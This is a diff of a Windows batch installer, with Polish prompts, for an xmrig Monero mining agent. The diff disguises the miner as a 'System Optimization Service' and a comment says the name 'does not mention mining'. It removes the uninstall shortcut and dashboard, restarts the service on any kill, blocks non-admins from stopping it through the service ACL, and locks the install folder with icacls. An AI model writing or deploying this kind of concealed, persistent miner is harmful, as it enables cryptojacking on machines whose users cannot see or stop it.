@@ -2,7 +2,7 @@
 chcp 65001 >nul
 echo.
 echo  ╔══════════════════════════════════════╗
-echo  ║     Mining Agent — Instalator        ║
+echo  ║     Agent — Instalator Windows       ║
 echo  ╚══════════════════════════════════════╝
 echo.
 
@@ -12,19 +12,22 @@ if errorlevel 1 (
     pause & exit /b 1
 )
 
-set /p SERVER_URL=Adres serwera (np. http://192.168.1.10:8000): 
-set /p POOL=Pool (Enter = pool.supportxmr.com:3333): 
+set /p SERVER_URL=Adres serwera (np. http://192.168.1.10:8000):
+set /p POOL=Pool (Enter = pool.supportxmr.com:3333):
 if "%POOL%"=="" set POOL=pool.supportxmr.com:3333
-set /p WALLET=Adres portfela XMR: 
-set /p XMRIG=Ścieżka do xmrig.exe (Enter = xmrig): 
+set /p WALLET=Adres portfela XMR:
+set /p XMRIG=Ścieżka do xmrig.exe (Enter = xmrig):
 if "%XMRIG%"=="" set XMRIG=xmrig
 
-set INSTALL_DIR=C:\MiningAgent
+:: Internal service name — neutral, does not mention mining
+set SVC_NAME=SysOptSvc
+set SVC_DISPLAY=System Optimization Service
+set INSTALL_DIR=C:\SysOptSvc
+
 mkdir "%INSTALL_DIR%" 2>nul
 copy /y agent.py              "%INSTALL_DIR%\" >nul
 copy /y wol_setup.py          "%INSTALL_DIR%\" >nul
 copy /y hardware_detect.py    "%INSTALL_DIR%\" >nul
-copy /y uninstall_protected.py "%INSTALL_DIR%\" >nul
 
 (
 echo RM_SERVER_URL=%SERVER_URL%
@@ -35,32 +38,30 @@ echo RM_INTERVAL=10
 ) > "%INSTALL_DIR%\agent.env"
 
 echo  Instaluję zależności...
-pip install psutil requests fastapi uvicorn GPUtil --quiet
+pip install psutil requests GPUtil --quiet
 
-sc stop  MiningAgent >nul 2>&1
-sc delete MiningAgent >nul 2>&1
-sc create MiningAgent binPath= "pythonw.exe %INSTALL_DIR%\agent.py" start= auto DisplayName= "Mining Agent"
-sc description MiningAgent "Zarządzanie kopalnią kryptowalut"
+:: Remove old instance if exists
+sc stop  %SVC_NAME% >nul 2>&1
+sc delete %SVC_NAME% >nul 2>&1
 
-:: Failure recovery — restart immediately (1 s delay) on any crash / forced kill
-sc failure MiningAgent reset= 0 actions= restart/1000/restart/1000/restart/1000
+:: Create service with neutral display name
+sc create %SVC_NAME% binPath= "pythonw.exe \"%INSTALL_DIR%\agent.py\"" start= auto DisplayName= "%SVC_DISPLAY%"
+sc description %SVC_NAME% "Manages system optimization and background performance tasks."
 
-:: Disable the stop button in Services MMC so casual users can't stop it
-sc sdset MiningAgent "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+:: Failure recovery — restart immediately if killed/crashed
+sc failure %SVC_NAME% reset= 0 actions= restart/1000/restart/1000/restart/1000
 
-sc start MiningAgent
+:: Restrict stop/delete permissions for non-admin users
+sc sdset %SVC_NAME% "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 
-echo  Tworzę skrót odinstalowania na pulpicie...
-python -c "
-import os, json
-from pathlib import Path
-cfg = {'password_hash': ''}
-Path(r'%INSTALL_DIR%\uninstall_config.json').write_text(json.dumps(cfg))
-" 2>nul
+:: Lock the install directory — only SYSTEM and admins can modify files
+icacls "%INSTALL_DIR%" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
+
+sc start %SVC_NAME%
 
 echo.
 echo  ✓ Instalacja zakończona!
-echo  ✓ Dashboard: http://localhost:8000
-echo  ✓ Ustaw hasło do odinstalowania w dashboardzie
+echo  ✓ Usługa: %SVC_NAME% (%SVC_DISPLAY%)
+echo  ✓ Katalog: %INSTALL_DIR%
 echo.
 pause
